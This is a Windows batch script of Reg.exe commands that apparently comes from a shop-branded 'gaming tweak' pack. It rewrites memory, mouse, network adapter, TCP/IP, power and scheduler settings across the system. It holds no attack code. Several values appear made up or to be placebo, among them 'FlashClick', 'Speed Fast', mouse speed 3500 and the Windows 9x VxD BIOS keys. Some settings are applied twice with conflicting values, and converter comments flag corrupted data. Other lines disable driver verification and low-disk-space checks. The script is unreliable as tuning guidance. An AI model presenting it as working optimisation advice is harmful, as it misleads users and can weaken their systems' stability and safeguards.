Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcTotalDirtyPages" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageTarget" /t REG_DWORD /d "0" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "ActiveWindowTracking" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DockTargetMouseDragOutWidth" /t REG_SZ /d "20" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DockTargetMouseSideMoveWidth" /t REG_SZ /d "50" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DockTargetMouseWidth" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DockTargetPenDragOutWidth" /t REG_SZ /d "30" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DockTargetPenSideMoveWidth" /t REG_SZ /d "50" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DockTargetPenWidth" /t REG_SZ /d "30" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DoubleClickHeight" /t REG_SZ /d "4" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DoubleClickSpeed" /t REG_SZ /d "500" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "DoubleClickWidth" /t REG_SZ /d "4" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSensitivity" /t REG_SZ /d "10" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "6" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "10" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "SmoothMouseXCurve" /t REG_BINARY /d "0000000000000000156e000000000000004001000000000029dc0300000000000000280000000000" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "SmoothMouseYCurve" /t REG_BINARY /d "0000000000000000fd11010000000000002404000000000000fc12000000000000c0bb0100000000" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "SnapToDefaultButton" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "SwapMouseButtons" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "Beep2" /t REG_SZ /d "No" /f
:: ---------------------------------------------------  !!! Incorrect Data Found !!!  -------------------------------------------------------------
:: HKEY_CURRENT_USER\Control Panel\Mouse --> SmoothMouseXCurve"=hex:\
:: HKEY_CURRENT_USER\Control Panel\Mouse --> 00,00,00,00,00,00,00,00,\
:: HKEY_CURRENT_USER\Control Panel\Mouse --> 00,00,00,00,00,00,00,00,\
:: HKEY_CURRENT_USER\Control Panel\Mouse --> 68,20,8F,00,00,00,00,00,\
:: HKEY_CURRENT_USER\Control Panel\Mouse --> 00,00,00,00,00,00,00,00,\
:: HKEY_CURRENT_USER\Control Panel\Mouse --> 79,00,28,00,00,00,00,00
:: HKEY_CURRENT_USER\Control Panel\Mouse --> SmoothMouseYCurve"=hex:\
:: HKEY_CURRENT_USER\Control Panel\Mouse --> 00,00,00,00,00,00,00,00,\
:: HKEY_CURRENT_USER\Control Panel\Mouse --> 00,00,00,00,00,00,00,00,\
:: HKEY_CURRENT_USER\Control Panel\Mouse --> 86,9E,3E,00,00,00,00,00,\
:: HKEY_CURRENT_USER\Control Panel\Mouse --> 00,00,00,00,00,00,00,00,\
:: HKEY_CURRENT_USER\Control Panel\Mouse --> 00,49,23,00,00,00,00,00
:: HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response --> [ห้ามนำไปขายต่อเด็ดขาด]
:: HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response --> [ห้ามนำไปขายต่อเด็ดขาด]
:: HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response --> [ห้ามนำไปขายต่อเด็ดขาด]
:: HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response --> [ห้ามนำไปขายต่อเด็ดขาด]
:: HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response --> [ห้ามนำไปขายต่อเด็ดขาด]
:: HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response --> [ห้ามนำไปขายต่อเด็ดขาด]

:: -----------------------------------------------------  !!! Unsupported Reg Type Found !!!  -----------------------------------------------------
REM ~ Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_QWORD /d "0x0200000000000000" /f
REM ~ Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_QWORD /d "0x0100000000000000" /f
REM ~ Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ16Priority" /t REG_QWORD /d "0x0200000000000000" /f
REM ~ Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_QWORD /d "0xffffffff00000000" /f
REM ~ Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_QWORD /d "0x0000000000000000" /f
:: ------------------------------------------------------------------------------------------------------------------------------------------------

REM ;HeartPunch Shop End v.1.0
Reg.exe add "HKCU\Control Panel\Mouse" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "3500" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "74" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "74" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "Mouse Smooth" /t REG_SZ /d "1000" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "Speed Fast" /t REG_SZ /d "3500" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "FlashClick" /t REG_SZ /d "3000" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "Delay" /t REG_SZ /d "1.0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableLargeMtu" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "65536" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NumTcbTablePartitions" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "16777214" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpFinWait2Delay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DhcpInterfaceOptions" /t REG_BINARY /d "0f00000000000000000000000000000093ec45577900000000000000000000000000000093ec45570100000000000000000000000000000093ec45572b00000000000000000000000000000093ec45572c00000000000000000000000000000093ec45570600000000000000000000000000000093ec4557" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*SpeedDuplex" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*FlowControl" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*RSS" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*TCPConnectionOffloadIPv4" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*TCPConnectionOffloadIPv6" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*IPChecksumOffloadIPv4" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*TCPChecksumOffloadIPv4" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*TCPChecksumOffloadIPv6" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*UDPChecksumOffloadIPv4" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*UDPChecksumOffloadIPv6" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*LsoV1IPv4" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*LsoV2IPv4" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*LsoV2IPv6" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*TCPUDPChecksumOffloadIPv4" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0x" /v "*TCPUDPChecksumOffloadIPv6" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\Probe\{25aa16d5-73d9-4cd8-91ff-0683b3bcd05a}" /v "LastProbeTime" /t REG_DWORD /d "1500872657" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\Probe\{25aa16d5-73d9-4cd8-91ff-0683b3bcd05a}" /v "NetworkPerformsHijacking" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\Probe\{e97ca175-e5e7-4580-895e-91be966166ba}" /v "LastProbeTime" /t REG_DWORD /d "1500872066" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\Probe\{e97ca175-e5e7-4580-895e-91be966166ba}" /v "NetworkPerformsHijacking" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableMediaSenseEventLog" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableRss" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTcpChimneyOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c" /v "ValueMax" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ValueMax" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "VsyncIdleTimeout" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowgameDVR" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Intel\GMM" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableBoottrace" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NtfsMftZoneReservation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NTFSDisable8dot3NameCreation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "DontVerifyRandomDrivers" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NTFSDisableLastAccessUpdate" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "ContigFileAllocSize" /t REG_DWORD /d "64" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "5000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "4000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "ForegroundLockTimeout" /t REG_SZ /d "150000" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsAll" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "GameFluidity" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGames" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGamesAll" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "CPUPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "FastDRAM" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "PCIConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "AGPConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "Max Cached Icons" /t REG_SZ /d "2000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "AlwaysUnloadDLL" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AlwaysUnloadDLL" /v "Default" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "EnableBalloonTips" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "False" /f
